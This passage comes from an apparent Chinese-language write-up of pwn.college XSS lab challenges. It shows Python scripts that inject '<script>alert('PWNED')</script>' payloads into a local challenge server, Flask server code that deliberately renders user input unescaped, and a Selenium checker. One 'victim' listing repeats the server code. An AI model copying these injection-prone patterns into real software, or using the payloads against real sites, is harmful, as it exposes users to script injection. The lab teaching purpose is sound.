文件并去掉多余的空白字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出正在访问的 URL</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Visiting <span class="subst">&#123;challenge_url&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试访问 challenge_url，获取页面内容并分析其中的 &lt;input&gt; 标签的数量</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配页面中所有的 &lt;input&gt; 标签，count 返回匹配的数量</span></span><br><span class="line">    num_inputs = <span class="built_in">len</span>(re.findall(<span class="string">r&quot;&lt;input[^&lt;]*&gt;&quot;</span>, requests.get(challenge_url, timeout=<span class="number">1</span>).text))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 &lt;input&gt; 标签的数量小于或等于 2，输出提示信息</span></span><br><span class="line">    <span class="keyword">if</span> num_inputs &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You did not inject an &lt;input&gt; textbox...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果页面中有超过 2 个 &lt;input&gt; 标签，说明成功注入了文本框，输出 flag</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You got it! Here is your flag:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)  <span class="comment"># 打印 flag</span></span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">    <span class="comment"># 如果出现连接错误，表示无法访问该 URL，可能是服务未运行</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connection error... Is the service running?&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-15-XSS-2"><a href="#3-15-XSS-2" class="headerlink" title="3.15 XSS 2"></a>3.15 XSS 2</h3><p>这个是要我们注入一个<code>javascript alert(&quot;PWN&quot;)</code>具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 数据，注入一个 alert(&quot;PWNED&quot;) 的脚本</span></span><br><span class="line">data = &#123;<span class="string">&quot;content&quot;</span>: <span class="string">&quot;&lt;script&gt;alert(&#x27;PWNED&#x27;);&lt;/script&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查请求是否成功</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Payload injected successfully!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to inject payload.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>server代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile  <span class="comment"># 用于创建临时文件</span></span><br><span class="line"><span class="keyword">import</span> sqlite3   <span class="comment"># 用于SQLite数据库操作</span></span><br><span class="line"><span class="keyword">import</span> flask     <span class="comment"># 导入Flask框架，构建Web应用</span></span><br><span class="line"><span class="keyword">import</span> os        <span class="comment"># 用于访问操作系统功能，如生成随机密钥</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建Flask应用对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个临时的数据库类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，suffix=&quot;.db&quot;表示文件后缀为.db</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 创建数据库连接</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 设置返回结果为行的形式，方便通过字段名访问</span></span><br><span class="line">        cursor = connection.cursor()  <span class="comment"># 创建数据库游标</span></span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL语句</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化临时数据库</span></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个名为 posts 的表，并插入一条初始数据</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT &quot;First Post!&quot; AS content&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 POST 请求，用于提交内容</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 获取表单中提交的内容，默认为空字符串</span></span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将提交的内容插入到数据库的 posts 表中</span></span><br><span class="line">    db.execute(<span class="string">&quot;INSERT INTO posts VALUES (?)&quot;</span>, [content])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提交后重定向回当前页面</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 GET 请求，用于获取并显示当前所有帖子</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># HTML 页面初始内容</span></span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, the anonymous posting service. Post away!\n&quot;</span></span><br><span class="line">    page += <span class="string">&quot;&lt;form method=post&gt;Post:&lt;input type=text name=content&gt;&lt;/form&gt;\n&quot;</span>  <span class="comment"># 提交表单，用户可以输入内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从数据库中获取所有的帖子内容并显示</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT content FROM posts&quot;</span>).fetchall():</span><br><span class="line">        page += <span class="string">&quot;&lt;hr&gt;&quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;\n&quot;</span>  <span class="comment"># 为每个帖子内容添加水平分隔线</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>  <span class="comment"># 返回整个页面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置Flask应用的密钥，用于会话管理等</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Flask应用的服务器名称，用于生成完整的URL</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用，监听80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>victim代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile  <span class="comment"># 用于创建临时文件</span></span><br><span class="line"><span class="keyword">import</span> sqlite3   <span class="comment"># 用于SQLite数据库操作</span></span><br><span class="line"><span class="keyword">import</span> flask     <span class="comment"># 导入Flask框架，构建Web应用</span></span><br><span class="line"><span class="keyword">import</span> os        <span class="comment"># 用于访问操作系统功能，如生成随机密钥</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建Flask应用对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个临时的数据库类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，suffix=&quot;.db&quot;表示文件后缀为.db</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 创建数据库连接</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 设置返回结果为行的形式，方便通过字段名访问</span></span><br><span class="line">        cursor = connection.cursor()  <span class="comment"># 创建数据库游标</span></span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL语句</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化临时数据库</span></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个名为 posts 的表，并插入一条初始数据</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT &quot;First Post!&quot; AS content&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 POST 请求，用于提交内容</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 获取表单中提交的内容，默认为空字符串</span></span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将提交的内容插入到数据库的 posts 表中</span></span><br><span class="line">    db.execute(<span class="string">&quot;INSERT INTO posts VALUES (?)&quot;</span>, [content])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提交后重定向回当前页面</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 GET 请求，用于获取并显示当前所有帖子</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># HTML 页面初始内容</span></span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, the anonymous posting service. Post away!\n&quot;</span></span><br><span class="line">    page += <span class="string">&quot;&lt;form method=post&gt;Post:&lt;input type=text name=content&gt;&lt;/form&gt;\n&quot;</span>  <span class="comment"># 提交表单，用户可以输入内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从数据库中获取所有的帖子内容并显示</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT content FROM posts&quot;</span>).fetchall():</span><br><span class="line">        page += <span class="string">&quot;&lt;hr&gt;&quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;\n&quot;</span>  <span class="comment"># 为每个帖子内容添加水平分隔线</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>  <span class="comment"># 返回整个页面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置Flask应用的密钥，用于会话管理等</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Flask应用的服务器名称，用于生成完整的URL</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用，监听80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-16-XSS-3"><a href="#3-16-XSS-3" class="headerlink" title="3.16 XSS 3"></a>3.16 XSS 3</h3><p>这个题要我们执行一个<strong>反射型 XSS</strong>注入：服务器通过 <code>flask.request.args.get(&quot;msg&quot;, &quot;(none)&quot;)</code> 获取 URL 参数 <code>msg</code>，并将其直接渲染到 HTML 中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The message: &#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span><br><span class="line">        &lt;hr&gt;&lt;form&gt;Craft a message:&lt;<span class="built_in">input</span> <span class="built_in">type</span>=text name=msg&gt;&lt;<span class="built_in">input</span> <span class="built_in">type</span>=submit value=Submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>因此我们在victim中直接通过<code>/challenge/victim &quot;http://challenge.localhost:80/?msg=&lt;script&gt;alert(&#39;PWNED&#39;);&lt;/script&gt;&quot;</code> 注入脚本</p><p>server代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask   <span class="comment"># 导入 Flask 库，用于构建 Web 应用</span></span><br><span class="line"><span class="keyword">import</span> os      <span class="comment"># 导入 os 库，用于操作系统级别的功能（例如生成随机密钥）</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建一个 Flask 应用对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)  </span><span class="comment"># 定义路由，监听 GET 请求，访问根路径 &quot;/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 返回一个包含 HTML 内容的响应</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;pwnmsg ephemeral message service&lt;/h1&gt;  &lt;!-- 标题部分，显示服务名称 --&gt;</span></span><br><span class="line"><span class="string">        The message: <span class="subst">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span>  &lt;!-- 获取 URL 参数 &quot;msg&quot; 并显示，如果没有该参数，则显示 &quot;(none)&quot; --&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;  &lt;!-- 分隔线 --&gt;</span></span><br><span class="line"><span class="string">        &lt;form&gt;  &lt;!-- 表单部分，用户可以输入消息 --&gt;</span></span><br><span class="line"><span class="string">            Craft a message:&lt;input type=text name=msg&gt;  &lt;!-- 输入框，name 为 &quot;msg&quot; --&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=submit value=Submit&gt;  &lt;!-- 提交按钮 --&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 当访问根路径时，浏览器会展示上面定义的 HTML 页面，</span></span><br><span class="line">    <span class="comment"># 其中包含了输入框，用户可以在输入框中输入内容并提交，提交的内容将通过 URL 参数 &quot;msg&quot; 传递给服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的 secret_key，用于保护会话数据和其他加密操作</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置服务器的名称和端口（例如，URL 为 http://challenge.localhost:80）</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Flask Web 服务器，在本地的 80 端口监听 HTTP 请求</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>victim代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> psutil  <span class="comment"># 导入用于处理进程和系统信息的库</span></span><br><span class="line"><span class="keyword">import</span> urllib  <span class="comment"># 导入用于 URL 解析和操作的库</span></span><br><span class="line"><span class="keyword">import</span> atexit   <span class="comment"># 导入用于程序退出时执行清理操作的库</span></span><br><span class="line"><span class="keyword">import</span> time     <span class="comment"># 导入用于时间操作的库</span></span><br><span class="line"><span class="keyword">import</span> sys      <span class="comment"># 导入系统级功能的库，用于获取命令行参数和退出程序</span></span><br><span class="line"><span class="keyword">import</span> os       <span class="comment"># 导入操作系统级别的功能，如环境变量、权限设置等</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入 Selenium WebDriver 库以及其相关配置，用于自动化浏览器操作</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.options <span class="keyword">import</span> Options <span class="keyword">as</span> FirefoxOptions  <span class="comment"># Firefox 浏览器的配置</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.service <span class="keyword">import</span> Service <span class="keyword">as</span> FirefoxService  <span class="comment"># 用于启动 Firefox 浏览器的服务</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By  <span class="comment"># 用于查找页面元素的方法</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait  <span class="comment"># 用于显式等待，等待某些条件满足</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC  <span class="comment"># 用于定义等待条件</span></span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException, WebDriverException  <span class="comment"># 用于捕获超时和浏览器异常</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置程序的 UID 为当前用户的有效 UID</span></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空当前环境变量，确保程序在干净的环境下运行</span></span><br><span class="line">os.environ.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置系统的 PATH 环境变量，确保必要的系统命令可以正确执行</span></span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 Firefox 浏览器的选项，开启无头模式</span></span><br><span class="line">options = FirefoxOptions()</span><br><span class="line">options.add_argument(<span class="string">&quot;--headless&quot;</span>)  <span class="comment"># 启用无头模式，浏览器界面不会显示</span></span><br><span class="line">service = FirefoxService(log_path=<span class="string">&quot;/dev/null&quot;</span>)  <span class="comment"># 创建 Firefox 服务实例，忽略日志</span></span><br><span class="line">browser = webdriver.Firefox(service=service, options=options)  <span class="comment"># 创建一个 Firefox 浏览器的 WebDriver 实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保在程序退出时正确关闭浏览器</span></span><br><span class="line">atexit.register(browser.quit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查命令行参数，确保提供了 URL 参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> URL&quot;</span>)  <span class="comment"># 如果没有提供 URL 参数，则输出使用方法</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)  <span class="comment"># 退出程序，状态码为 1 表示错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析提供的 URL</span></span><br><span class="line">challenge_url = sys.argv[<span class="number">1</span>]  <span class="comment"># 获取命令行中传入的 URL</span></span><br><span class="line">url_parsed = urllib.parse.urlparse(challenge_url)  <span class="comment"># 使用 urllib 解析 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 URL 的主机名是否为 &quot;challenge.localhost&quot;，确保我们正在访问正确的主机</span></span><br><span class="line"><span class="keyword">if</span> url_parsed.hostname != <span class="string">&quot;challenge.localhost&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hostname should be &#x27;challenge.localhost&#x27;.&quot;</span>)  <span class="comment"># 如果主机名不正确，则提示错误</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)  <span class="comment"># 退出程序，状态码为 2 表示错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 URL 的端口号是否为 80</span></span><br><span class="line"><span class="keyword">if</span> url_parsed.port <span class="keyword">not</span> <span class="keyword">in</span> &#123;<span class="literal">None</span>, <span class="number">80</span>&#125;:  <span class="comment"># 如果没有指定端口，或者端口不是 80，抛出错误</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Port should be 80.&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">3</span>)  <span class="comment"># 退出程序，状态码为 3 表示错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出将要访问的 URL，并使用 Selenium 浏览器访问该 URL</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Visiting <span class="subst">&#123;challenge_url&#125;</span>&quot;</span>)</span><br><span class="line">browser.get(challenge_url)  <span class="comment"># 打开给定的 URL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 显式等待，等待页面中弹出 JavaScript alert 对话框</span></span><br><span class="line">    WebDriverWait(browser, <span class="number">1</span>).until(EC.alert_is_present())  <span class="comment"># 等待最多 1 秒，直到 alert 弹出</span></span><br><span class="line"><span class="keyword">except</span> TimeoutException:</span><br><span class="line">    <span class="comment"># 如果超过等待时间仍未弹出 alert，则输出错误信息并退出程序</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failure: JavaScript alert did not trigger...&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">3</span>)  <span class="comment"># 退出程序，状态码为 3 表示错误</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 如果 alert 成功弹出，说明 JavaScript 被执行了</span></span><br><span class="line">    <span class="built_in">print</span>(<span 